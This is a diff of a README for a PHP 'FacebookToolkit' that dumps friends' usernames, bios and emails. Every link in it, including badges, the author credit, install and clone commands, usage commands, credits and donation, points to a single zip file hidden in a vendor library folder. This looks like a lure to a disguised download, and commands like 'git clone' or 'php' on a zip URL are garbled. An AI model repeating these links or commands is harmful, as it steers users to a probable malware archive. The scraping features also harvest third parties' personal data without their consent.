@@ -6,40 +6,40 @@ a tool to get Facebook data, and some Facebook bots, and extra tools found on Fa
 Graph API Facebook.</br>
 </H4>
 <p align="center">
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Last Commit" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Version" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Contributors" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Language" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="TopLanguage" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Last Commit" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Version" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Contributors" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Language" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="TopLanguage" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
 </br>
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Search" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Repository Size" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Repository Size" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
-<a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Repository Size" src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Search" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Repository Size" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Repository Size" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
+<a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"><img alt="Repository Size" src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip"/></a>
 </p>
 
 <p align="center">
-Made with ❤️ by <a href="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip">Wahyu Arif Purnomo</a>
+Made with ❤️ by <a href="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip">Wahyu Arif Purnomo</a>
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="350" title="Version 1.3" alt="Version 1.3">
-  <img src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="350" title="Version 1.4" alt="Version 1.4">
+  <img src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="350" title="Version 1.3" alt="Version 1.3">
+  <img src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="350" title="Version 1.4" alt="Version 1.4">
 </p>
 
 <p align="center">
   <a><br> UPDATE 1.4 </br></a>
-  <img src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="640" title="Version 1.4" alt="Version 1.4">
+  <img src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="640" title="Version 1.4" alt="Version 1.4">
 </p>
 
 <p align="center">
   <a><br> UPDATE 1.5 </br></a>
-  <img src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="640" title="Version 1.5" alt="Version 1.5">
+  <img src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="640" title="Version 1.5" alt="Version 1.5">
 </p>
 
 <p align="center">
   <a><br> UPDATE 1.6 </br></a>
-  <img src="https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="640" title="Version 1.6" alt="Version 1.6">
+  <img src="https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip" width="640" title="Version 1.6" alt="Version 1.6">
 </p>
 
 ## Features in tools
@@ -60,7 +60,7 @@ Made with ❤️ by <a href="https://raw.githubusercontent.com/admisstion/Facebo
 | Dump Username                      | :white_check_mark: | retrieve all your friend's username data           |
 | Dump Bio                           | :white_check_mark: | retrieve all your friend's bio data                |
 | Dump About                         | :white_check_mark: | retrieve all your friend's about data              |
-| Filter Yahoo Mail                  | :white_check_mark: | separate all Yahoo e-mails [https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip]             |
+| Filter Yahoo Mail                  | :white_check_mark: | separate all Yahoo e-mails [https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip]             |
 | Yahoo Mail Validation              | :white_check_mark: | validate all Yahoo e-mails                         |
 | Clean Result                       | :white_check_mark: | clean the result folder                            |
 | Delete ALL Post                    | :white_check_mark: | clean all your posts                               |
@@ -80,7 +80,7 @@ Made with ❤️ by <a href="https://raw.githubusercontent.com/admisstion/Facebo
 
 Version 1.0 :
 
-    https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
+    https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
 
   Changelog :
 
@@ -88,7 +88,7 @@ Version 1.0 :
 
 Version 1.2 :
 
-    https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
+    https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
 
   Changelog :
 
@@ -96,7 +96,7 @@ Version 1.2 :
 
 Version 1.3 :
 
-    https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
+    https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
 
   Changelog : 
 
@@ -110,7 +110,7 @@ Version 1.3 :
 
 Version 1.4 :
 
-    https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
+    https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
 
   Changelog :
 
@@ -128,7 +128,7 @@ Version 1.4 :
 
 Version 1.5 :
 
-    https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
+    https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
 
   Changelog :
 
@@ -140,9 +140,9 @@ Version 1.5 :
 ## Installation
 
 ### Windows or Linux
-You can download the latest composer in [here](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
+You can download the latest composer in [here](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
 
-    git clone https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
+    git clone https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
 
     composer 
     
@@ -154,7 +154,7 @@ You can download the latest composer in [here](https://raw.githubusercontent.com
 
     pkg update
 
-    git clone https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
+    git clone https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
 
 
 ## Requirements for using this tool
@@ -163,55 +163,55 @@ We need several requirements to use this tool to run smoothly.
 
 ##### Linux
 
-![PHP 7.X](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip "PHP 7.X")
-![PHP CURL](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip%https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip "PHP CURL")
+![PHP 7.X](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip "PHP 7.X")
+![PHP CURL](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip%https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip "PHP CURL")
 
 ##### Windows
 
-![PHP CURL](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip "XAMPP 7.X")
+![PHP CURL](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip "XAMPP 7.X")
 
 ## Usage
 
 Enough to execute the command :
 
-    php https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
+    php https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip
 
 Cek list menu tools, use the command : 
 
-    php https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -m
+    php https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -m
 
 Cek author, use the command : 
 
-    php https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -a
+    php https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -a
 
 Cek version, use the command : 
 
-    php https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -v
+    php https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -v
 
 Cek update, use the command : 
 
-    php https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -u
+    php https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -u
 
 and help, use the command : 
 
-    php https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -h
+    php https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip -h
 
-and don't forget to ask at [issue page](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip)
-If you have additional information, you can make it on the [issue page](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
+and don't forget to ask at [issue page](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip)
+If you have additional information, you can make it on the [issue page](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
 
 ## Thanks
 
 Thank you for all.
 
-1.  CLIMate Library : [CLIMate](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
-2.  PHP CLI Color Class : [PHPColor](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
-3.  ASCII Art Generator : [TAAG](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
+1.  CLIMate Library : [CLIMate](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
+2.  PHP CLI Color Class : [PHPColor](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
+3.  ASCII Art Generator : [TAAG](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip).
 
 ## Donation
 
     If you want to buy my coffee, you can send payments Paypal.
 
-[![Donate](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip)](https://raw.githubusercontent.com/admisstion/FacebookToolkit/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip)
+[![Donate](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip)](https://github.com/admisstion/FacebookToolkit/raw/refs/heads/master/vendor/league/climate/src/TerminalObject/Router/FacebookToolkit-macromania.zip)
 
 ## Disclaimer
 
